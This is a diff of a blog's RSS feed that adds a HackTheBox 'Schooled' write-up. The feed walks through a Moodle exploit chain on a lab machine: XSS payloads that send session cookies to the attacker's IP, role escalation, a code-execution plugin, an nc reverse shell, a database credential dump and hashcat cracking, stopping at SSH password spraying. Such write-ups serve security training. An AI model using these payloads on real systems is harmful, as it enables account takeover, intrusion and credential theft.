@@ -5,7 +5,459 @@
     <link>https://fahmifj.github.io/categories/writeup/</link>
     <description>Recent content in Writeup on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sun, 12 Sep 2021 12:33:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 16 Sep 2021 18:22:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Schooled</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</link>
+      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</guid>
+      <description>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system.</description>
+      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials, allowing me to recover a password from the database. The password is reused by one of the users for SSH login. The user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and this can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Stealing cookie with XSS</li>
+<li>Moodle exploitation</li>
+<li>Sudo exploitation on <code>pkg</code></li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.234
+Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> closed ports
+Reason: <span class="m">65532</span> resets
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
+33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
+<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
+<p>Port 80 serving a homepage of a school institution.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
+</p>
+<p>In the About section, it states that this school has an online learning system using Moodle, which the most popular LMS.</p>
+<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
+</p>
+<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
+</p>
+<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it&rsquo;s 404.</p>
+<p><div class="img-container"><img src="imgs/image-20210518041456970.png" alt="image-20210518041456970"  /></div>
+</p>
+<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
+</p>
+<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
+</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
+<span class="m">20750</span>
+→ root@kali «schooled» «10.10.14.49» 
+$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
+<span class="m">20750</span>
+</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
+<span class="o">[</span>+<span class="o">]</span> Method:       GET
+<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
+</code></pre></div><p>Update <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
+</code></pre></div><p>moodle.schooled.htb</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
+<span class="m">84</span>
+<span class="m">20750</span>
+</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
+<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>. There are four courses available here.</p>
+<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
+</p>
+<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
+<p><div class="img-container"><img src="imgs/image-20210518173145572.png" alt="image-20210518173145572"  /></div>
+</p>
+<h4 id="account-register">Account Register</h4>
+<p>It seems to register an account, I have to use the domain <code>student.schooled.htb</code>. I will change my email domain and login afterwards.</p>
+<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
+</p>
+<p>After adding <code>student.schooled.htb</code> domain to my <code>/etc/hosts</code>, I visited the domain, but it&rsquo;s just the same site as <code>schooled.htb</code>.</p>
+<h4 id="enroll-course">Enroll course</h4>
+<p>Based on the login activity only one of four teachers that seems to be active, that teacher is Manuel Phillips. So I will enroll to his course (it allows self-enroll).</p>
+<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
+</p>
+<p>On the Mathematics course, there are two announcements .</p>
+<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
+</p>
+<p>The first one titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips contains the following:</p>
+<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
+</p>
+<p>After searching the MoodleNet on Google, I can found it under <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
+<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
+</p>
+<p>And the other one by Jamie Borham, which seems to be a reminder.</p>
+<p><div class="img-container"><img src="imgs/image-20210518175145618.png" alt="image-20210518175145618"  /></div>
+</p>
+<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
+<h4 id="exploit-db">Exploit-DB</h4>
+<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
+<ul>
+<li>Moodle 3.6.1 - Persistent Cross-Site Scripting (XSS) =&gt; CVE-2019-3810, PrivEsc student to administrator vs. box release 2021.</li>
+<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
+<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
+</ul>
+<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
+</p>
+<h4 id="moodle-security">Moodle Security</h4>
+<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>.</p>
+<p>Searching page by page, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
+<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
+</p>
+<p>Another one that looks promising is the privilege escalation from the teacher role and manager role.</p>
+<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
+</p>
+<h3 id="testing-xss">Testing XSS</h3>
+<h4 id="moodle-3103---label-persistent-cross-site-scripting">Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting</h4>
+<p>I tried <code>Moodle 3.10.3 - 'label' Persistent Cross Site Scripting</code> using the following payload.</p>
+<pre tabindex="0"><code>&lt;img src=&quot;http://10.10.14.49/iamf.js&quot; onerror=&quot;alert('iamf')&quot; /&gt;
+</code></pre><p><div class="img-container"><img src="imgs/image-20210518214318578.png" alt="image-20210518214318578"  /></div>
+</p>
+<p>It worked.</p>
+<p><div class="img-container"><img src="imgs/image-20210518214351609.png" alt="image-20210518214351609"  /></div>
+</p>
+<p>Unfortunately, it&rsquo;s an XHR.. didn&rsquo;t know how to get the link, and probably teacher won&rsquo;t look into calendar.</p>
+<p>Based on this XSS, it seems the currently hosted Moodle version is &lt; 3.10.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
+<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
+<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo; twice. Therefore, I&rsquo;m guessing that the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) affected the MoodleNet profile fits this. With XSS I can attempt to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal Phillip&rsquo;s cookie session</a>.</p>
+<p>I will have my Netcat listening on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>Or this one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
+</p>
+<p>After a few minutes, there is a request coming to my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ nc -nvlp <span class="m">80</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
+GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
+Host: 10.10.14.49
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
+</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
+<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
+</p>
+<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
+<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
+</p>
+<p>By visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>, I can confirm that this Moodle version is 3.9.</p>
+<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
+</p>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
+<p>With Phillips&rsquo;s account, I can confirm that I have the teacher role now, and since the version is known, I can attempt to exploit the privilege escalation (<code>CVE-2020-14321</code>) that affected this Moodle version.</p>
+<p>The researcher who found this vulnerability made a public exploit for this on Github: <a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a>. He also created step by step video on <a href="https://vimeo.com/441698193">https://vimeo.com/441698193</a>.</p>
+<p>Using the video as reference, the first step is enroll one of the teacher to my course.</p>
+<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
+</p>
+<p>I will enroll Jamie Borham to my course and submit on <code>Enrol users</code> button.</p>
+<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
+</p>
+<p>I will intercept the request using Burp Suite and change the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
+<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
+</p>
+<p>On the course participant, I can see Phillips now has the manager role assigned.</p>
+<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
+</p>
+<p>With manager role, I have the ability to impersonate my participant using &ldquo;Login as&rdquo; function. For example, if I want to login as Jane Higgins, it has to be on my course (mathematics) as participant first.</p>
+<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
+</p>
+<h4 id="malicious-plugin">Malicious Plugin</h4>
+<p>When impersonating Lianne Carter, I see another menu called &ldquo;Site Administration&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
+</p>
+<p>According to the exploit author of <a href="https://github.com/HoangKien1020/CVE-2020-14321">CVE-2020-14321</a>, with manager role, I can obtain code execution on the underlying system by installing a malicious plugin. This can be done only if the manager role has full permissions (from my understanding this is possible because Lianne Carter has administrative access and manager role).</p>
+<p>That said, I have to edit the manager role permission under <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
+</p>
+<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
+<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
+</p>
+<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
+</p>
+<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code></p>
+<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
+</p>
+<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
+</p>
+<p>I will just continue on the installation process.</p>
+<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
+</p>
+<p>Once the plugin is installed, it can be access on.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"> http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]
+</code></pre></div><p>And I have RCE now</p>
+<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>Since it&rsquo;s FreeBSD, I will send the mkfifo payload .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
+</code></pre></div><p>On my listener:</p>
+<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
+</p>
+<p>I will upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
+$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+$ which stty
+which stty
+/bin/stty
+$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
+→ root@kali «exploits» «10.10.14.49» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>
+
+$ ls -l
+total <span class="m">0</span>
+$ ls -la
+total <span class="m">0</span>
+$ <span class="nb">pwd</span>
+/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-jamie">Shell as jamie</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>There are two users other than root who have login shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
+jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
+steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
+$ ls -l /home/
+total <span class="m">17</span>
+drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
+drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
+</code></pre></div><p>The directory of the web is discovered under <code>/usr/local/www/apache24/data</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ls -l
+total <span class="m">18</span>
+-rw-r--r--   <span class="m">1</span> www  www  <span class="m">84</span> Dec <span class="m">19</span> 15:41 index.html
+drwxr-xr-x  <span class="m">56</span> www  www  <span class="m">95</span> Feb <span class="m">27</span> 14:33 moodle
+drwxr-xr-x   <span class="m">6</span> www  www  <span class="m">11</span> Feb <span class="m">27</span> 17:18 schooled.htb
+$ <span class="nb">pwd</span>
+/usr/local/www/apache24/data
+</code></pre></div><p>The config file contains database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
+&lt;?php  // Moodle configuration file
+
+unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
+global <span class="nv">$CFG</span><span class="p">;</span>
+<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
+  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
+  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
+  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
+  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
+<span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>
+
+require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+</code></pre></div><h4 id="mysql">MySQL</h4>
+<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -pPlaybookMaster2020
+mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+Your MySQL connection id is <span class="m">7517</span>
+Server version: 8.0.23 Source distribution
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+
+moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
+</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
++-------------------+--------------------------------------------------------------+
+<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
++-------------------+--------------------------------------------------------------+
+<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
+<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
++-------------------+--------------------------------------------------------------+
+<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
+</code></pre></div><p>There are a lot of hashes to recover, so I will focus on the admin first.</p>
+<h4 id="crack-hash">Crack hash</h4>
+<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
+<pre tabindex="0"><code>$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
+Time.Started.....: Thu May 20 05:04:20 2021 (1 min, 25 secs)
+Time.Estimated...: Thu May 20 05:05:45 2021 (0 secs)
+Guess.Base.......: File (../rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      166 H/s (2.93ms) @ Accel:4 Loops:2 Thr:11 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 13992/14344386 (0.10%)
+Rejected.........: 0/13992 (0.00%)
+Restore.Point....: 13728/14344386 (0.10%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
+Candidates.#1....: david23 -&gt; 110487
+Hardware.Mon.#1..: Temp: 90c Util: 88% Core:1708MHz Mem:3504MHz Bus:16
+
+Started: Thu May 20 05:04:18 2021
+Stopped: Thu May 20 05:05:46 2021
+</code></pre><h4 id="password-spray">Password Spray</h4>
+<p>I spray the password on SSH, and it reveals that it&rsquo;s password for user <strong>jamie</strong>.</p>
